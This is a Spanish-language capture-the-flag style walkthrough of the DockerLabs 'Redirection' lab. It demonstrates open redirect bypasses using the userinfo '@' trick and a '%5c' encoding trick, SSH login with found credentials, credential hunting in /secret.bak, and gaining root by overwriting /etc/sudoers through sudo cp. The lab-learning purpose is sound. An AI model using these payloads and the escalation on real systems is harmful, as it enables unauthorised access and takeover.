# Máquina: Redirection — DockerLabs

**Dificultad:** Fácil  
**SO:** Debian Linux  
**IP objetivo:** `172.17.0.2`  
**Tipo:** Bug Bounty  
**Técnicas:** Open Redirect · URL encoding bypass · Credential hunting · sudo cp

---

## Flujo del ataque

```
Nmap (SSH + HTTP) → Laboratorios de Open Redirect (3 niveles)
→ Lab1 (sin validación) → Lab2 (bypass @) → Lab3 (URL encoding)
→ secret.bak → su balulito → sudo cp /etc/sudoers → root
```

---

## 1. Reconocimiento

### Ping

```bash
ping -c 4 172.17.0.2
```

```
4 packets transmitted, 4 received, 0% packet loss
```

TTL = 64 → Sistema Linux confirmado.

### Nmap

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -vvv -oN scan 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                     |
|--------|--------|----------|-----------------------------|
| 22/tcp | open   | SSH      | OpenSSH 9.2p1 Debian        |
| 80/tcp | open   | HTTP     | Apache httpd 2.4.62 Debian  |

---

## 2. Página principal — Laboratorios de Open Redirect

La página anuncia un **"Laboratorio de Open Redirect"** con tres niveles. Al hacer clic en el botón de finalización aparece una alert con credenciales SSH:

```
Usuario: balu
Password: balulero
```

Las credenciales deben usarse solo después de completar los laboratorios.

---

## 3. Laboratorio 1 — Open Redirect sin validación

```bash
curl -L http://172.17.0.2/laboratorio1/redirect.php?url=https://github.com/fareszuleta
```

El endpoint acepta cualquier URL externa sin validación.

**Laboratorio 1 completado** — Open Redirect trivial sin restricciones.

---

## 4. Laboratorio 2 — Bypass con @ (User Info)

```bash
curl -L http://172.17.0.2/laboratorio2/redirect.php?url=https://github.com/fareszuleta
```

```
Redirección no permitida. Solo puedes redirigirte a Google.
```

La validación busca `google.com` en la cadena. Sin embargo, la sintaxis de URL permite:

```
scheme://userinfo@host/path
```

Colocando Google como userinfo y el sitio malicioso como host:

```bash
curl -L http://172.17.0.2/laboratorio2/redirect.php?url=https://www.google.com@github.com/fareszuleta
```

Se redirige a GitHub usando el bypass.

**Laboratorio 2 completado** — Bypass mediante userinfo en URL.

---

## 5. Laboratorio 3 — Backslash + URL encoding

```bash
curl -L http://172.17.0.2/laboratorio3/redirect.php?url=https://github.com/fareszuleta\@www.google.com
```

```
Redirección no permitida.
```

El servidor rechaza el backslash literal. URL-encoded como `%5c`:

```bash
curl -L http://172.17.0.2/laboratorio3/redirect.php?url=https://github.com/fareszuleta%5c%40www.google.com
```

Al interceptar con Burp, el servidor interpreta:

```
GET /@www.google.com HTTP/1.1
Host: github.com
```

El backslash decodificado actúa como path separator.

**Laboratorio 3 completado** — Bypass mediante URL encoding de caracteres especiales.

Referencia: [OWASP Open Redirect](https://owasp.org/www-community/attacks/open_redirect)

---

## 6. Acceso SSH — balu:balulero

```bash
ssh balu@172.17.0.2
# Password: balulero
```

---

## 7. Búsqueda de credenciales

`balu` no tiene permisos sudo:

```bash
sudo -l
# Sorry, user balu may not run sudo
```

Buscamos archivos en raíz:

```bash
ls -la /
# secret.bak
```

```bash
cat /secret.bak
```

```
balulito:balulerochingon
```

Credenciales alternativas encontradas.

---

## 8. Escalada final — sudo cp

```bash
su balulito
# Password: balulerochingon
```

```bash
sudo -l
```

```
(ALL) NOPASSWD: /bin/cp
```

Creamos un archivo sudoers personalizado:

```bash
echo 'balulito ALL=(ALL:ALL) ALL' > sudoers
sudo cp sudoers /etc/sudoers
```

```bash
sudo su
```

```
root@40e7bc142419:/home/balulito# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Credenciales

| Usuario   | Contraseña        | Método                        |
|-----------|-------------------|-------------------------------|
| balu      | balulero          | Página principal              |
| balulito  | balulerochingon   | /secret.bak                   |
| root      | —                 | sudo cp /etc/sudoers override |

---

## Referencias

- [OWASP — Open Redirect](https://owasp.org/www-community/attacks/open_redirect)
- [GTFOBins — cp](https://gtfobins.github.io/gtfobins/cp/)
- [RFC 3986 — Userinfo](https://tools.ietf.org/html/rfc3986#section-3.2.1)
